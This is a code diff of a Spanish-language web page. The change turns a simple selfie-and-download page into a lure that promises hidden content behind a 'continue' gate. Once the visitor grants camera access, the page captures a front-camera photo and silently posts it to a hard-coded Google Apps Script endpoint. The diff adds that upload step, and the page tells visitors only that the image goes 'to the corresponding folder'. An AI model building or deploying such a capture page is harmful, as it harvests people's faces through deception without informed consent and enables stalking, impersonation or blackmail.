@@ -3,73 +3,205 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+
 <title>Continuar</title>
+
 <style>
-body{margin:0;min-height:100vh;display:grid;place-items:center;background:#111;color:#fff;font-family:Arial,sans-serif;text-align:center}
-.box{width:min(92vw,520px);padding:24px;box-sizing:border-box}
-video{width:100%;border-radius:18px;background:#000;display:none;transform:scaleX(-1)}
-canvas{display:none}
-button{border:0;border-radius:12px;padding:14px 22px;font-size:17px;font-weight:700;cursor:pointer;margin:8px}
-#snap{display:none;background:#4ade80;color:#062b13}
-#download{display:none;background:#60a5fa;color:#061a35;text-decoration:none}
-#status{color:#ddd;line-height:1.5;font-size:18px}
+body{
+  margin:0;
+  min-height:100vh;
+  display:grid;
+  place-items:center;
+  background:#111;
+  color:#fff;
+  font-family:Arial,sans-serif;
+  text-align:center;
+}
+
+.box{
+  width:min(92vw,520px);
+  padding:24px;
+  box-sizing:border-box;
+}
+
+h1{
+  font-size:30px;
+  margin-bottom:10px;
+}
+
+#status{
+  color:#ddd;
+  line-height:1.5;
+  font-size:18px;
+}
+
+video{
+  width:100%;
+  border-radius:18px;
+  background:#000;
+  display:none;
+  transform:scaleX(-1);
+}
+
+canvas{
+  display:none;
+}
+
+button{
+  border:0;
+  border-radius:12px;
+  padding:14px 22px;
+  font-size:17px;
+  font-weight:700;
+  cursor:pointer;
+  margin:8px;
+}
+
+#snap{
+  display:none;
+  background:#4ade80;
+  color:#062b13;
+}
+
+#privacy{
+  font-size:13px;
+  color:#999;
+  margin-top:15px;
+}
 </style>
 </head>
+
 <body>
+
 <div class="box">
-<h1>Para continuar</h1>
-<p id="status">Debes permitir para continuar en la página.</p>
+
+<h1>✨ Continúa para descubrirlo</h1>
+
+<p id="status">
+Para continuar, necesitas permitir el acceso a la cámara.
+</p>
 
 <video id="video" autoplay playsinline></video>
 
 <div>
-<button id="snap">Continuar</button>
-<a id="download"><button>Descargar foto</button></a>
+  <button id="snap">📸 Hacer foto y continuar</button>
 </div>
 
+<p id="privacy">
+Al hacer la foto, la imagen se enviará a la carpeta correspondiente.
+</p>
+
 <canvas id="canvas"></canvas>
+
 </div>
 
 <script>
-const video=document.getElementById('video');
-const canvas=document.getElementById('canvas');
-const snap=document.getElementById('snap');
-const download=document.getElementById('download');
-const status=document.getElementById('status');
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const snap = document.getElementById("snap");
+const status = document.getElementById("status");
+
+const SCRIPT_URL =
+"https://script.google.com/macros/s/AKfycbxKnxewNGNAv6eciNxDBqoCWzzvC29DyjeEwxD7c77PXdNxhGe9qoeT4dSGUxKZuTN4/exec";
+
 
 async function iniciar(){
+
   try{
-    const stream=await navigator.mediaDevices.getUserMedia({
-      video:{facingMode:"user"},
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video:{
+        facingMode:"user"
+      },
       audio:false
     });
 
-    video.srcObject=stream;
-    video.style.display="block";
-    snap.style.display="inline-block";
-    status.textContent="Ya puedes continuar.";
+    video.srcObject = stream;
+
+    video.style.display = "block";
+    snap.style.display = "inline-block";
+
+    status.textContent =
+      "¡Perfecto! Cuando estés preparado, haz la foto para continuar.";
+
   }catch(e){
-    status.textContent="Debes permitir para continuar en la página.";
+
+    status.textContent =
+      "Necesitas permitir el acceso a la cámara para continuar.";
+
   }
+
 }
 
-snap.onclick=()=>{
-  canvas.width=video.videoWidth;
-  canvas.height=video.videoHeight;
 
-  const ctx=canvas.getContext("2d");
+snap.onclick = async () => {
+
+  snap.disabled = true;
+  snap.textContent = "Enviando...";
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  const ctx = canvas.getContext("2d");
+
   ctx.translate(canvas.width,0);
   ctx.scale(-1,1);
-  ctx.drawImage(video,0,0,canvas.width,canvas.height);
 
-  download.href=canvas.toDataURL("image/jpeg",0.92);
-  download.download="foto.jpg";
-  download.style.display="inline-block";
+  ctx.drawImage(
+    video,
+    0,
+    0,
+    canvas.width,
+    canvas.height
+  );
 
-  status.textContent="Foto realizada.";
+  const imagen = canvas.toDataURL(
+    "image/jpeg",
+    0.92
+  );
+
+  status.textContent = "📤 Enviando la foto...";
+
+  try{
+
+    await fetch(SCRIPT_URL,{
+      method:"POST",
+      mode:"no-cors",
+      body:JSON.stringify({
+        image:imagen
+      })
+    });
+
+    status.textContent =
+      "✅ Foto enviada. Puedes continuar.";
+
+    snap.style.display = "none";
+
+    const stream = video.srcObject;
+
+    if(stream){
+      stream.getTracks().forEach(track => track.stop());
+    }
+
+    video.style.display = "none";
+
+  }catch(error){
+
+    status.textContent =
+      "❌ No se ha podido enviar la foto. Inténtalo de nuevo.";
+
+    snap.disabled = false;
+    snap.textContent = "📸 Hacer foto y continuar";
+
+  }
+
 };
 
+
 window.addEventListener("load",iniciar);
+
 </script>
+
 </body>
 </html>
